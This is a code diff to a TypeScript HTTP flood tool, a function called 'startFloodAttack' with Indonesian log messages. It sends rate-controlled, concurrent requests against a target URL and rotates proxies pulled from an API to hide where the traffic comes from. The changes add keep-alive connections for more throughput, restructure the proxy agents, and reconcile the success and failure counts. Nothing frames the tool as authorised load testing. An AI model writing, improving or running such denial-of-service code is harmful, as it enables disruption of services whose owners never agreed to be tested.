@@ -81,7 +81,9 @@ export async function startFloodAttack(
         const key = parts[0].trim();
         const value = parts.slice(1).join(':').trim();
         if (key && value) {
-          parsedHeaders[key] = value;
+          if (key.toLowerCase() !== 'host') { // Explicitly ignore Host header for safety
+            parsedHeaders[key] = value;
+          }
           if (key.toLowerCase() === 'user-agent') {
             customUserAgentProvided = true;
           }
@@ -186,7 +188,7 @@ export async function startFloodAttack(
 
   console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi awal: ${currentActiveProxies.length}, API Proksi: ${proxyApiUrl ?? 'Tidak ada'}, HTTP/1.1 Paksa: ${isHttp1Forced}`);
   
-  const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ alpnProtocols: ['http/1.1'] }) : undefined;
+  const http1Agent = isHttp1Forced && parsedUrl.protocol === "https:" ? new https.Agent({ keepAlive: true, alpnProtocols: ['http/1.1'] }) : undefined;
   
   const activePromises: Promise<void>[] = [];
   const totalRequestsToAttempt = safeDuration * safeRate;
@@ -196,7 +198,6 @@ export async function startFloodAttack(
         const now = Date.now();
         if (now >= endTime) break;
 
-        // Dynamic proxy refresh logic
         if (proxyApiUrl && (now - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
             console.log("Refreshing proxies from API:", proxyApiUrl);
             const newApiProxies = await tryFetchFromApi(proxyApiUrl);
@@ -209,12 +210,10 @@ export async function startFloodAttack(
             }
         }
         
-        // Concurrency control: if we have too many in-flight requests, wait for one to finish
         if (activePromises.length >= safeConcurrency) {
-            await Promise.race(activePromises).catch(() => {}); // Wait for the first promise to settle, ignore errors here
+            await Promise.race(activePromises).catch(() => {});
         }
 
-        // --- Start of a single request setup ---
         let currentFetchOptions = { ...baseFetchOptions };
         const currentHeaders = {...parsedHeaders};
 
@@ -228,17 +227,17 @@ export async function startFloodAttack(
         if (currentActiveProxies.length > 0) {
           const proxyConfig = currentActiveProxies[i % currentActiveProxies.length];
           try {
-            if (isHttp1Forced && parsedUrl.protocol === "https:") {
-              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, { alpnProtocols: ['http/1.1'] });
-            } else {
-              agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`);
-            }
+            const proxyAgentOptions = {
+                keepAlive: true,
+                ...(isHttp1Forced && parsedUrl.protocol === "https:" && { alpnProtocols: ['http/1.1'] })
+            };
+            agentToUse = new HttpsProxyAgent(`http://${proxyConfig}`, proxyAgentOptions);
           } catch (e: any) {
             console.error(`Error creating proxy agent for ${proxyConfig}:`, e.message);
             failed++;
             statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
             totalSent++;
-            continue; // Skip this request if proxy agent fails
+            continue;
           }
         } else if (http1Agent) {
             agentToUse = http1Agent;
@@ -247,7 +246,6 @@ export async function startFloodAttack(
         if (agentToUse) {
             currentFetchOptions.agent = agentToUse;
         }
-        // --- End of a single request setup ---
 
         const requestPromise = fetch(targetUrl, currentFetchOptions)
             .then(response => {
@@ -270,7 +268,6 @@ export async function startFloodAttack(
             })
             .finally(() => {
               totalSent++;
-              // Remove promise from active list
               const index = activePromises.indexOf(requestPromise);
               if (index > -1) {
                   activePromises.splice(index, 1);
@@ -279,7 +276,6 @@ export async function startFloodAttack(
 
         activePromises.push(requestPromise);
         
-        // Rate limiting: sleep to maintain the desired RPS
         const elapsedMs = Date.now() - startTime;
         const expectedElapsedMsForNextRequest = (i + 1) * (1000 / safeRate);
         const sleepDuration = expectedElapsedMsForNextRequest - elapsedMs;
@@ -289,7 +285,6 @@ export async function startFloodAttack(
         }
     }
 
-    // Wait for all remaining requests to complete after the loop finishes
     await Promise.allSettled(activePromises);
 
   } catch (e: any) {
@@ -299,7 +294,29 @@ export async function startFloodAttack(
     console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
   }
 
-  return { totalSent, successful, failed, statusCodeCounts };
+  // Rekonsiliasi akhir untuk menjamin konsistensi
+  let reconciledSuccessful = 0;
+  let reconciledFailed = 0;
+  let reconciledTotal = 0;
+
+  for (const codeStr in statusCodeCounts) {
+    const code = parseInt(codeStr, 10);
+    const count = statusCodeCounts[code] || 0;
+    reconciledTotal += count;
+    if (code >= 200 && code < 400) {
+      reconciledSuccessful += count;
+    } else {
+      reconciledFailed += count;
+    }
+  }
+
+  // Menggunakan hasil rekonsiliasi untuk memastikan data yang ditampilkan konsisten.
+  return { 
+    totalSent: reconciledTotal, 
+    successful: reconciledSuccessful, 
+    failed: reconciledFailed, 
+    statusCodeCounts 
+  };
 }
 
 export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
@@ -413,12 +430,9 @@ export async function getUserIpAddress(): Promise<{ ip: string | null; error?: s
   try {
     const fwd = headers().get('x-forwarded-for');
     if (fwd) {
-      // The x-forwarded-for header can be a comma-separated list of IPs.
-      // The client's IP is typically the first one.
       const clientIp = fwd.split(',')[0].trim();
       return { ip: clientIp };
     }
-    // Fallback if the primary header isn't found
     const realIp = headers().get('x-real-ip');
     if (realIp) {
       return { ip: realIp.split(',')[0].trim() };
@@ -430,6 +444,3 @@ export async function getUserIpAddress(): Promise<{ ip: string | null; error?: s
     return { ip: null, error: "Gagal mengambil alamat IP dari server." };
   }
 }
-    
-
-    
